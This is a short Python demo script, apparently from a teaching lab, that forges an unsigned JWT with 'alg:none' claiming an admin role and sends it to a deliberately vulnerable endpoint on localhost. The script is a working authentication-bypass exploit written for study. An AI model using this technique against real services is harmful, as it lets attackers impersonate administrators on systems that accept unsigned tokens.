"""Educational alg:none attack demo against local vulnerable app only."""

from __future__ import annotations

import requests  # Import requests for local vulnerable endpoint interaction.

from src.jwt_utils import create_none_token  # Import unsigned token helper.

VULN_BASE = "http://localhost:8001"  # Define vulnerable app base URL for local demo.


def run_attack() -> dict:
    """Forge unsigned admin token and call vulnerable endpoint."""

    forged = create_none_token({"sub": "attacker", "role": "admin"})  # Forge unsigned token with elevated role claims.
    response = requests.get(f"{VULN_BASE}/vuln/none/protected", params={"token": forged}, timeout=8)  # Send forged token to vulnerable endpoint.
    return {"status_code": response.status_code, "response": response.json()}  # Return structured attack result payload.


if __name__ == "__main__":
    print(run_attack())  # Execute and print attack result for local education.
